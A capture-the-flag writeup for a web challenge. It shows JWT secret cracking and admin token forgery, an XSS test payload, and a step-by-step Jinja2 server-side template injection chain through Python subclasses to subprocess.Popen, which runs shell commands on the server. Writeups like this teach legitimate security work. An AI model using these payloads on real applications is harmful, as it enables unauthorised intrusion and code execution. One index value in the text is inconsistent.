---
title: "Tempate Shack"
subtitle: "Hacktivitycon Pre-Game '21'"
author: SinDaRemedy
date: "2021-09-13"
subject: "Template Shack Writeup"
keywords: \[Hacktivitycon, CTF, InfoSec\]
lang: "en"
titlepage: true
titlepage-text-color: "FFFFFF"
titlepage-color: "0c0d0e"
titlepage-rule-color: "8ac53e"
titlepage-rule-height: 0
logo: "./logo.png"
logo-width: 3in
toc: true
toc-own-page: true
---

# Template Shack

Writeup by: [SinDaRemedy](https://github.com/SinDaRemedy)

Team: [OnlyFeet](https://ctftime.org/team/144644)

Writeup URL: [GitHub](https://infosecstreams.github.io/csaw21/Template_Shack/)

----

![[Screen Shot 2021-09-14 at 5.03.40 AM.png]]

## Initial Research

When I entered the site the first thing i noticed was the login portal. I inspected the page source, clicked on sb admin 2 to see if I'd find anyting interesting but there was nothing to be found. 

![[Screen Shot 2021-09-14 at 4.11.55 AM.png]]

Of course, as most of us would do, I tried to login in with the common default creds and then proceeded to look for other vectors.  Checked out the browser inspector and burpsuite  and realized there was a token in the cookies. 

I made note of the server and checked for vulnerabilities for Python 3.6.9 then found [**CVE-2019-16935**](https://nvd.nist.gov/vuln/detail/CVE-2019-16935#vulnCurrentDescriptionTitle) and a weakness enumeration for XSS at [**CWE-79**](http://cwe.mitre.org/data/definitions/79.html)

![[Screen Shot 2021-09-14 at 4.26.54 AM.png]]

![[Screen Shot 2021-09-14 at 12.49.18 AM.png]]

Since token-based authentication doesn't require that the server know about the session data and I had a hash I figured this would be a possible attack vector. I made a file with the token and and decoded the hash with John-the-Ripper (john).  We cracked the hash and the password was "**supersecret**"

![[Screen Shot 2021-09-14 at 1.22.07 AM.png]]

At the same time I was also working on decoding and creating a new web token for the admin. I changed the guest to admin and entered the password in order to get my new hash.

![[Screen Shot 2021-09-14 at 12.48.59 AM 1.png]]

## Initial Access/Testing

![[Screen Shot 2021-09-14 at 4.31.10 AM.png]]

Then it was time for the next logical step.. Let's see if this exploit actually works!

First thing I wanted to see is if I can get an XSS alert

``` Javascript
username=<Script Language="Javascript">alert("You've been attacked!");</Script>
```

![[Screen Shot 2021-09-14 at 1.24.59 AM.png]]


Then I wanted to see if we could get a Server Side Template Injection with jinja by doing some basic math. 

``` python
{{7*7}}
```

![[Screen Shot 2021-09-14 at 1.22.55 AM.png]]

## Payload 

Immediately after started to craft a payload with a couple of things in mind. 

- The goal was to get command execution
- One thing I knew was python **metadata properties can be accessed through any object. **
	- I needed to first start with accessing the "**__class__**" from the metaproperties.
		- Then proceed to accessing the Method Resolution Object (**MRO**) since from there I could start to enumerate the hierarchy and subclasses. 
		- From the subclasses we have to try to gain access to a class that will allow us to execute commands

**All payloads are entered after the url as a path**

``` python
{{''.__class__}}
```

![[Screen Shot 2021-09-14 at 2.31.10 AM.png]]

``` python
{{''.__class__.__mro__}}
```

![[Screen Shot 2021-09-14 at 3.41.32 AM.png]]

```python
{{' '.__class__.__mro__[0].__subclasses__()}}
```

![[Screen Shot 2021-09-14 at 2.40.48 AM.png]]

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

![[Screen Shot 2021-09-14 at 2.42.39 AM.png]]

I copied and pasted all the output in to "subclasses.txt".  cleaned up the data so that it was more manageable. 

``` shell
cat subclasses.txt| tr ',' '\n' > subclasses_new.txt
```

Since the goal of this payload is to [execute a command through the shell](https://docs.python.org/2/library/subprocess.html#popen-constructor) I wanted to begin searching for the **Popen** class. I filtered the search in "subclasses_new.txt" for "Popen" and seen that  "subprocess.Popen" was indexed as #405 on the list (Starting with 0). 

![[Screen Shot 2021-09-14 at 3.04.35 AM.png]]

I confirmed that it was the indexed as 405 in the list by adding it to the to the payload. 

``` python
{{[].__class__.__mro__[1].__subclasses__()[245]}}

<class 'subprocess.Popen'>
```

![[Screen Shot 2021-09-14 at 3.33.26 AM.png]]

After making note of that I continued to modify the script as shown below and test the command execution.

``` python
{{[].__class__.__mro__[1].__subclasses__()[405]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}
```

![[Screen Shot 2021-09-14 at 3.40.04 AM.png]]

You can see that flag.txt is in the current directory so now all there was to do was change the command in order to retrieve the flag. So we change "ls -la" to "cat flag.txt" 

![[Screen Shot 2021-09-14 at 4.06.11 AM.png]]

## Victory!!

Now to submit the flag!

flag{easy_jinja_SSTI_RCE}

